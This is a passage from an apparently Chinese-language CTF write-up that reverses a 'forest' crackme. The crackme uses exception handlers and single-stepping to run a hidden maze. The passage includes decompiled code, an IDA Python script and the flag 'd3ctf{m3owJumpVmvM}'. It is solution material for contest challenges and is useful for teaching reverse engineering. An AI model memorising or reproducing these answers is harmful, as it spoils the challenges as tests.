rgb(255, 115, 253);">3</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">2</span>)<br />flag[<span style="color: rgb(255, 115, 253);">3</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">2</span>] ^= flag[<span style="color: rgb(255, 115, 253);">3</span>]<br />flag[<span style="color: rgb(255, 115, 253);">2</span>] = (flag[<span style="color: rgb(255, 115, 253);">2</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">5</span>) | (flag[<span style="color: rgb(255, 115, 253);">2</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">3</span>)<br />flag[<span style="color: rgb(255, 115, 253);">2</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">1</span>] ^= flag[<span style="color: rgb(255, 115, 253);">2</span>]<br />flag[<span style="color: rgb(255, 115, 253);">1</span>] ^= <span style="color: rgb(255, 115, 253);">3</span><br />flag[<span style="color: rgb(255, 115, 253);">1</span>] = (flag[<span style="color: rgb(255, 115, 253);">1</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">3</span>) | (flag[<span style="color: rgb(255, 115, 253);">1</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">5</span>)<br />flag[<span style="color: rgb(255, 115, 253);">1</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br /><span style="color: rgb(146, 255, 184);"># flag[0] ^= flag[1]</span><br />print(bytes(flag))</code></pre><p>解密拿到flag<code style="font-family: SFMono-Regular, Consolas, ;">d3ctf{m3owJumpVmvM}</code></p><h2>forest</h2><p>main里面检查flag格式，把输入的17个字符转换称01字符串，末尾加0</p><p>重点在<code style="font-family: SFMono-Regular, Consolas, ;">sub_CE1F50</code>里面，把一段内存设置为可执行，然后触发<code style="font-family: SFMono-Regular, Consolas, ;">int 3</code>异常，使用<code style="font-family: SFMono-Regular, Consolas, ;">sub_CE1A00</code>函数（execption_handle）处理异常</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=70d58c5d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhibsguqzJ9usZMIjwGnr335waDJgAticibDfWFSRfU1yHic7iasKzfwxO1Zw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="927" /></p><p><br /></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">unsigned int __thiscall execption_handle(unsigned int **this){  unsigned int result; // eax  unsigned int *v3; // ecx  unsigned int *v4; // eax  _DWORD *v5; // eax  int v6; // ecx  unsigned int v7; // edx  void **v8; // ecx  int v9; // esi  int i; // ecx  int v11; // edx  int v12; // eax  int v13; // esi  int v14; // edx  void **v15; // eax  int v16; // [esp+10h] [ebp-2Ch]  int v17; // [esp+14h] [ebp-28h]  _DWORD *v18; // [esp+18h] [ebp-24h]  GetCurrentThreadId();  result = **this;  if ( result &lt;= 0xC0000005 )  {    if ( result != 0xC0000005 )    {      if ( result != 0x80000003 )      {        if ( result != 0x80000004 )          return result;        v3 = this[1];        if ( ((v3[46] - (_DWORD)&amp;code) &amp; 0x3F) == 7 &amp;&amp; v3[44] == 1 )          v3[46] += 0x17;        v4 = this[1];        goto LABEL_33;      }      if ( byte_CE6028 )      {        byte_CE6028 = 0;        R2 = (int)malloc(4u);        R1 = (int)malloc(4u);        v5 = malloc(4u);        v6 = R1;        v7 = kk;        v18 = v5;        R0 = (int)v5;        *(_DWORD *)R1 = 0;        *v5 = 0;        v17 = v6;        if ( (unsigned int)len &gt; v7 )        {          v8 = &amp;flag;          if ( HIDWORD(len) &gt;= 0x10 )            v8 = (void **)flag;          v16 = R2;          v9 = 0;          *(_DWORD *)R2 = *((_BYTE *)v8 + v7) != 0x30;          kk = v7 + 1;          for ( i = 0; i &lt; 0x483D; ++i )          {            if ( *((_BYTE *)&amp;code + i) == 0xFF              &amp;&amp; *((_BYTE *)&amp;code + i + 1) == 0xFF              &amp;&amp; *((_BYTE *)&amp;code + i + 2) == 0xFF              &amp;&amp; *((_BYTE *)&amp;code + i + 3) == 0xFF )            {              v11 = v9 % 5;              if ( v9 % 5 == 1 || v11 == 3 )              {                v12 = v17;                      // R1              }              else if ( v11 == 2 || v11 == 4 )              {                v12 = (int)v18;                 // R0              }              else              {                v12 = v16;                      // R2              }              *(_DWORD *)((char *)&amp;code + i) = v12;              ++v9;              i += 3;            }          }          this[1][46] = (unsigned int)&amp;code;          this[1][48] |= 0x100u;          return -1;        }LABEL_39:        sub_CE28B0();      }      return(0);    }    right();  }  if ( result != 0xC0000096 )    return result;  v13 = kk;  v14 = *(_DWORD *)R1 + 17 * *(_DWORD *)R0;  if ( kk &gt;= (unsigned int)len )  {    return(1);    goto LABEL_39;  }  v15 = &amp;flag;  if ( HIDWORD(len) &gt;= 0x10 )    v15 = (void **)flag;  *(_DWORD *)R2 = *((_BYTE *)v15 + kk) != 0x30;  kk = v13 + 1;  this[1][46] = (unsigned int)&amp;code + 0x40 * v14;  v4 = this[1];LABEL_33:  v4[48] |= 0x100u;  return -1;<br />}</code></pre><p>在execption_handle中根据异常码进行处理</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// ksarm.h</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> STATUS_ACCESS_VIOLATION 0xc0000005</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> STAUSBREAKPOINT 0x80000003</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> STATUS_SINGLE_STEP 0x80000004</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> STATUS_PRIVILEGED_INSTRUCTION 0xc0000096</span></code></pre><p>第一次<code style="font-family: SFMono-Regular, Consolas, ;">int 3</code>触发断点异常<code style="font-family: SFMono-Regular, Consolas, ;">0x80000003</code>，对应下面的异常处理代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">if (byte_CE6028){    byte_CE6028 = 0;    R2 = (int)malloc(4u);    R1 = (int)malloc(4u);    v5 = malloc(4u);    v6 = R1;    v7 = kk;    v18 = v5;    R0 = (int)v5;    *(_DWORD *)R1 = 0;    *v5 = 0;    v17 = v6;    if ((unsigned int)len &gt; v7)    {        v8 = &amp;flag;        if (HIDWORD(len) &gt;= 0x10)            v8 = (void **)flag;        v16 = R2;        v9 = 0;        *(_DWORD *)R2 = *((_BYTE *)v8 + v7) != 0x30;        kk = v7 + 1;        for (i = 0; i &lt; 0x483D; ++i)        {            if (*((_BYTE *)&amp;code + i) == 0xFF &amp;&amp; *((_BYTE *)&amp;code + i + 1) == 0xFF &amp;&amp; *((_BYTE *)&amp;code + i + 2) == 0xFF &amp;&amp; *((_BYTE *)&amp;code + i + 3) == 0xFF)            {                v11 = v9 % 5;                if (v9 % 5 == 1 || v11 == 3)                {                    v12 = v17; // R1                }                else if (v11 == 2 || v11 == 4)                {                    v12 = (int)v18; // R0                }                else                {                    v12 = v16; // R2                }                *(_DWORD *)((char *)&amp;code + i) = v12;                ++v9;                i += 3;            }        }        this[1][46] = (unsigned int)&amp;code;        this[1][48] |= 0x100u;        return -1;    }LABEL_39:    sub_CE28B0();<br />}</code></pre><p>这段代码只能执行一次，后续再触发<code style="font-family: SFMono-Regular, Consolas, ;">0x80000003</code>异常程序会结束运行，代码里面malloc了3个变量，并使用这3个变量替换code(前面修改了可执行权限的内存)中的<code style="font-family: SFMono-Regular, Consolas, ;">0xFFFFFFFF</code></p><p>R2的初值由<code style="font-family: SFMono-Regular, Consolas, ;">*(_DWORD *)R2 = *((_BYTE *)v8 + v7) != 0x30;</code>决定，这里是flag的第一个字符</p><p>将code初始化之后，<code style="font-family: SFMono-Regular, Consolas, ;">this[1][46] = (unsigned int)&amp;code;</code>修改线程结构体的EIP，使异常处理结束后程序进入到code中执行</p><p>分析一下code部分代码，code代码中包含很多的代码块，每一块的长度为0x40，根据前面修改的规律可以知道在code块中R0、R1、R2的位置固定</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d5ccb33e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhDqiarbdt1pEocHIJcdibZk0NBSwBtxiaGbdkyNTf3icjGnQy6qEq9uwJfw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="841" /></p><p><br /></p><p>代码块中还有cli指令，由于cli指令是特权指令，ring3无法执行，因此运行到cli指令会触发<code style="font-family: SFMono-Regular, Consolas, ;">0xc0000096</code>异常，分析对应的处理代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">v13 = kk;v14 = *(_DWORD *)R1 + 17 * *(_DWORD *)R0;if (kk &gt;= (unsigned int)len){    return (1);    goto LABEL_39;}v15 = &amp;flag;if (HIDWORD(len) &gt;= 0x10)    v15 = (void **)flag;*(_DWORD *)R2 = *((_BYTE *)v15 + kk) != 0x30;kk = v13 + 1;this[1][46] = (unsigned int)&amp;code + 0x40 * v14;v4 = this[1];<br />v4[48] |= 0x100u;</code></pre><p>cli指令触发异常后，根据<code style="font-family: SFMono-Regular, Consolas, ;">R1+17*R0</code>的值确定下一个执行的代码块，修改EIP进入新的代码块，并且根据flag的01字符设置R2</p><p>结合code中的内容，在code代码中会设置R0、R1的值，接着使用cli触发异常，根据R0、R1的值选择下一个代码块，R2中储存了flag的一个bit</p><p>调试发现在code中还会触发<code style="font-family: SFMono-Regular, Consolas, ;">0x80000004</code>异常</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=75c4286c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdhyW1te0W5rClrO6Q9hpFJBwbC2NJLZTJ7Z5F5sTBIiaX5JQ5iapZ7KxJw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="951" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9973e521&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKKHyC3gctqVFxbsH96wdh9wjcq7IgsEicmIkuaBXOQHxGBm2YGzicKnRTj4dWftthicp4zCCK1m9DQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="994" /></p><p><br /></p><p>跟踪一下发现这个异常是TF标志位造成的，TF标志位为1时，执行一条指令后就会触发<code style="font-family: SFMono-Regular, Consolas, ;">0x80000004</code>异常，在execption_handle中，返回时会设置<code style="font-family: SFMono-Regular, Consolas, ;">v4[48] |= 0x100u;</code>，这里设置的就是TF标志位</p><p>TF标志位触发异常后，会确定异常发生的位置，当异常发生位置为7，即<code style="font-family: SFMono-Regular, Consolas, ;">mov eax, [eax]</code>执行后，根据eax寄存器的确定是否进行跳转</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">if (result != 0x80000004)    return result;v3 = this[1];if (((v3[46] - (_DWORD)&amp;code) &amp; 0x3F) == 7 &amp;&amp; v3[44] == 1)    v3[46] += 0x17;v4 = this[1];<br />v4[48] |= 0x100u;</code></pre><p><br /></p><p>结合跳转的位置和code中的代码，这里实际是根据R2进行调整，如果R2，即flag为1，跳转到下一个cli块中设置R1、R0，综合分析知道这里是根据flag的01值决定下一个代码块，在每一个代码块中有两个可跳转的位置</p><p>使用IDA Python解析代码块，获取每个代码块中的两个跳转位置</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> idc<br /><span style="color: rgb(150, 203, 254);">import</span> idaapiimage_base = idaapi.get_imagebase()<br />code_off = <span style="color: rgb(255, 115, 253);">0x6030</span><br />code_size = <span style="color: rgb(255, 115, 253);">0x4840</span>start = image_base + code_offend = image_base + code_off + code_size<br />op_ls = [(-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>) <span style="color: rgb(150, 203, 254);">for</span> _ <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0x121</span>)]<br /><span style="color: rgb(150, 203, 254);">for</span> idx <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0x121</span>):<br />    ea = start + idx * <span style="color: rgb(255, 115, 253);">0x40</span><br />    print(<span style="color: rgb(168, 255, 96);">f"[<span style="color: rgb(218, 239, 163);">{hex(ea)}</span>]: "</span>)<br />    ins = idc.generate_disasm_line(ea, <span style="color: rgb(255, 115, 253);">0</span>)<br />    <span style="color: rgb(150, 203, 254);">if</span> (ins.startswith(<span style="color: rgb(168, 255, 96);">"mov     eax, 0FFFFFFFFh"</span>)):<br />        op1 = idc.print_operand(ea+<span style="color: rgb(255, 115, 253);">0x0C</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> (op1[-<span style="color: rgb(255, 115, 253);">1</span>] == <span style="color: rgb(168, 255, 96);">'h'</span>):<br />            op1 = int(op1[:-<span style="color: rgb(255, 115, 253);">1</span>], <span style="color: rgb(255, 115, 253);">16</span>)<br />        <span style="color: rgb(150, 203, 254);">else</span>:            op1 = int(op1)<br />        op2 = idc.print_operand(ea+<span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> (op2[-<span style="color: rgb(255, 115, 253);">1</span>] == <span style="color: rgb(168, 255, 96);">'h'</span>):<br />            op2 = int(op2[:-<span style="color: rgb(255, 115, 253);">1</span>], <span style="color: rgb(255, 115, 253);">16</span>)<br />        <span style="color: rgb(150, 203, 254);">else</span>:            op2 = int(op2)<br />        op3 = idc.print_operand(ea+<span style="color: rgb(255, 115, 253);">0x23</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> (op3[-<span style="color: rgb(255, 115, 253);">1</span>] == <span style="color: rgb(168, 255, 96);">'h'</span>):<br />            op3 = int(op3[:-<span style="color: rgb(255, 115, 253);">1</span>], <span style="color: rgb(255, 115, 253);">16</span>)<br />        <span style="color: rgb(150, 203, 254);">else</span>:            op3 = int(op3)<br />        op4 = idc.print_operand(ea+<span style="color: rgb(255, 115, 253);">0x2E</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> (op4[-<span style="color: rgb(255, 115, 253);">1</span>] == <span style="color: rgb(168, 255, 96);">'h'</span>):<br />            op4 = int(op4[:-<span style="color: rgb(255, 115, 253);">1</span>], <span style="color: rgb(255, 115, 253);">16</span>)<br />        <span style="color: rgb(150, 203, 254);">else</span>:            op4 = int(op4)<br />        ins = (op1+<span style="color: rgb(255, 115, 253);">17</span>*op2, op3+<span style="color: rgb(255, 115, 253);">17</span>*op4)<br />    <span style="color: rgb(150, 203, 254);">elif</span> (ins.startswith(<span style="color: rgb(168, 255, 96);">"int     3"</span>)):<br />        ins = (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>)    print(ins)    op_ls[idx] = ins<br />print(op_ls)</code></pre><p>在解析时发现除了上面正常的代码块，还有下面几种代码块</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""int     3add     [ecx-51h], ebxmov     eax, 1; mov     dword ptr [eax], 39393939hadd     [ebp+28D5560Ah], ecx<br />"""</span></code></pre><p>其中<code style="font-family: SFMono-Regular, Consolas, ;">int 3</code>触发<code style="font-family: SFMono-Regular, Consolas, ;">0x80000003</code>异常，由于该异常只能处理一次，所有遇到<code style="font-family: SFMono-Regular, Consolas, ;">int 3</code>的代码块会直接die掉</p><p>剩余3条指令会触发<code style="font-family: SFMono-Regular, Consolas, ;">0xC0000005</code>异常，该异常会进入right，输出正确信息</p><p>分析后可以知道本题其实是一道迷宫题，根据输入的flag决定走的路径，走到出口胜利</p><p>先找一下实际可到达的出口</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">op_ls = [(<span style="color: rgb(255, 115, 253);">11</span>, <span style="color: rgb(255, 115, 253);">41</span>), (<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">2</span>, <span style="color: rgb(255, 115, 253);">2</span>), (<span style="color: rgb(255, 115, 253);">3</span>, <span style="color: rgb(255, 115, 253);">3</span>), (<span style="color: rgb(255, 115, 253);">4</span>, <span style="color: rgb(255, 115, 253);">4</span>), (<span style="color: rgb(255, 115, 253);">5</span>, <span style="color: rgb(255, 115, 253);">5</span>), (<span style="color: rgb(255, 115, 253);">193</span>, <span style="color: rgb(255, 115, 253);">52</span>), (<span style="color: rgb(255, 115, 253);">7</span>, <span style="color: rgb(255, 115, 253);">7</span>), (<span style="color: rgb(255, 115, 253);">216</span>, <span style="color: rgb(255, 115, 253);">43</span>), (<span style="color: rgb(255, 115, 253);">116</span>, <span style="color: rgb(255, 115, 253);">13</span>), (<span style="color: rgb(255, 115, 253);">120</span>, <span style="color: rgb(255, 115, 253);">189</span>), (<span style="color: rgb(255, 115, 253);">82</span>, <span style="color: rgb(255, 115, 253);">244</span>), (<span style="color: rgb(255, 115, 253);">12</span>, <span style="color: rgb(255, 115, 253);">12</span>), (<span style="color: rgb(255, 115, 253);">8</span>, <span style="color: rgb(255, 115, 253);">15</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">72</span>, <span style="color: rgb(255, 115, 253);">95</span>), (<span style="color: rgb(255, 115, 253);">233</span>, <span style="color: rgb(255, 115, 253);">272</span>), (<span style="color: rgb(255, 115, 253);">211</span>, <span style="color: rgb(255, 115, 253);">194</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">59</span>, <span style="color: rgb(255, 115, 253);">230</span>), (<span style="color: rgb(255, 115, 253);">237</span>, <span style="color: rgb(255, 115, 253);">89</span>), (<span style="color: rgb(255, 115, 253);">60</span>, <span style="color: rgb(255, 115, 253);">190</span>), (<span style="color: rgb(255, 115, 253);">23</span>, <span style="color: rgb(255, 115, 253);">23</span>), (<span style="color: rgb(255, 115, 253);">243</span>, <span style="color: rgb(255, 115, 253);">232</span>), <span style="color: rgb(168, 255, 96);">'add     [ecx-51h], ebx'</span>, (<span style="color: rgb(255, 115, 253);">207</span>, <span style="color: rgb(255, 115, 253);">224</span>), <span style="color: rgb(168, 255, 96);">'mov     eax, 1'</span>, (<span style="color: rgb(255, 115, 253);">31</span>, <span style="color: rgb(255, 115, 253);">61</span>), (<span style="color: rgb(255, 115, 253);">151</span>, <span style="color: rgb(255, 115, 253);">179</span>), (<span style="color: rgb(255, 115, 253);">12</span>, <span style="color: rgb(255, 115, 253);">180</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">76</span>, <span style="color: rgb(255, 115, 253);">147</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">153</span>, <span style="color: rgb(255, 115, 253);">196</span>), (<span style="color: rgb(255, 115, 253);">279</span>, <span style="color: rgb(255, 115, 253);">271</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">276</span>, <span style="color: rgb(255, 115, 253);">7</span>), (<span style="color: rgb(255, 115, 253);">38</span>, <span style="color: rgb(255, 115, 253);">38</span>), (<span style="color: rgb(255, 115, 253);">39</span>, <span style="color: rgb(255, 115, 253);">39</span>), (<span style="color: rgb(255, 115, 253);">48</span>, <span style="color: rgb(255, 115, 253);">171</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">236</span>, <span style="color: rgb(255, 115, 253);">251</span>), (<span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(255, 115, 253);">192</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">125</span>, <span style="color: rgb(255, 115, 253);">165</span>), (<span style="color: rgb(255, 115, 253);">46</span>, <span style="color: rgb(255, 115, 253);">46</span>), (<span style="color: rgb(255, 115, 253);">260</span>, <span style="color: rgb(255, 115, 253);">27</span>), (<span style="color: rgb(255, 115, 253);">45</span>, <span style="color: rgb(255, 115, 253);">3</span>), (<span style="color: rgb(255, 115, 253);">174</span>, <span style="color: rgb(255, 115, 253);">190</span>), (<span style="color: rgb(255, 115, 253);">219</span>, <span style="color: rgb(255, 115, 253);">92</span>), (<span style="color: rgb(255, 115, 253);">51</span>, <span style="color: rgb(255, 115, 253);">51</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), <span style="color: rgb(168, 255, 96);">'add     [ebp+28D5560Ah], ecx'</span>, (<span style="color: rgb(255, 115, 253);">54</span>, <span style="color: rgb(255, 115, 253);">54</span>), (<span style="color: rgb(255, 115, 253);">280</span>, <span style="color: rgb(255, 115, 253);">204</span>), (<span style="color: rgb(255, 115, 253);">20</span>, <span style="color: rgb(255, 115, 253);">135</span>), (<span style="color: rgb(255, 115, 253);">57</span>, <span style="color: rgb(255, 115, 253);">57</span>), (<span style="color: rgb(255, 115, 253);">58</span>, <span style="color: rgb(255, 115, 253);">58</span>), (<span style="color: rgb(255, 115, 253);">59</span>, <span style="color: rgb(255, 115, 253);">59</span>), (<span style="color: rgb(255, 115, 253);">60</span>, <span style="color: rgb(255, 115, 253);">60</span>), (<span style="color: rgb(255, 115, 253);">223</span>, <span style="color: rgb(255, 115, 253);">235</span>), (<span style="color: rgb(255, 115, 253);">113</span>, <span style="color: rgb(255, 115, 253);">265</span>), (<span style="color: rgb(255, 115, 253);">55</span>, <span style="color: rgb(255, 115, 253);">278</span>), (<span style="color: rgb(255, 115, 253);">87</span>, <span style="color: rgb(255, 115, 253);">6</span>), (<span style="color: rgb(255, 115, 253);">19</span>, <span style="color: rgb(255, 115, 253);">214</span>), (<span style="color: rgb(255, 115, 253);">100</span>, <span style="color: rgb(255, 115, 253);">36</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">68</span>, <span style="color: rgb(255, 115, 253);">68</span>), (<span style="color: rgb(255, 115, 253);">69</span>, <span style="color: rgb(255, 115, 253);">69</span>), (<span style="color: rgb(255, 115, 253);">70</span>, <span style="color: rgb(255, 115, 253);">70</span>), (<span style="color: rgb(255, 115, 253);">130</span>, <span style="color: rgb(255, 115, 253);">24</span>), (<span style="color: rgb(255, 115, 253);">258</span>, <span style="color: rgb(255, 115, 253);">44</span>), (<span style="color: rgb(255, 115, 253);">73</span>, <span style="color: rgb(255, 115, 253);">73</span>), (<span style="color: rgb(255, 115, 253);">74</span>, <span style="color: rgb(255, 115, 253);">74</span>), (<span style="color: rgb(255, 115, 253);">75</span>, <span style="color: rgb(255, 115, 253);">75</span>), (<span style="color: rgb(255, 115, 253);">76</span>, <span style="color: rgb(255, 115, 253);">76</span>), (<span style="color: rgb(255, 115, 253);">77</span>, <span style="color: rgb(255, 115, 253);">77</span>), (<span style="color: rgb(255, 115, 253);">122</span>, <span style="color: rgb(255, 115, 253);">240</span>), (<span style="color: rgb(255, 115, 253);">79</span>, <span style="color: rgb(255, 115, 253);">79</span>), (<span style="color: rgb(255, 115, 253);">80</span>, <span style="color: rgb(255, 115, 253);">80</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">67</span>, <span style="color: rgb(255, 115, 253);">26</span>), (<span style="color: rgb(255, 115, 253);">83</span>, <span style="color: rgb(255, 115, 253);">83</span>), (<span style="color: rgb(255, 115, 253);">117</span>, <span style="color: rgb(255, 115, 253);">118</span>), (<span style="color: rgb(255, 115, 253);">85</span>, <span style="color: rgb(255, 115, 253);">85</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">106</span>, <span style="color: rgb(255, 115, 253);">73</span>), (<span style="color: rgb(255, 115, 253);">89</span>, <span style="color: rgb(255, 115, 253);">89</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">119</span>, <span style="color: rgb(255, 115, 253);">129</span>), (<span style="color: rgb(255, 115, 253);">93</span>, <span style="color: rgb(255, 115, 253);">93</span>), (<span style="color: rgb(255, 115, 253);">85</span>, <span style="color: rgb(255, 115, 253);">167</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">96</span>, <span style="color: rgb(255, 115, 253);">96</span>), (<span style="color: rgb(255, 115, 253);">97</span>, <span style="color: rgb(255, 115, 253);">97</span>), (<span style="color: rgb(255, 115, 253);">123</span>, <span style="color: rgb(255, 115, 253);">225</span>), (<span style="color: rgb(255, 115, 253);">259</span>, <span style="color: rgb(255, 115, 253);">173</span>), (<span style="color: rgb(255, 115, 253);">229</span>, <span style="color: rgb(255, 115, 253);">226</span>), 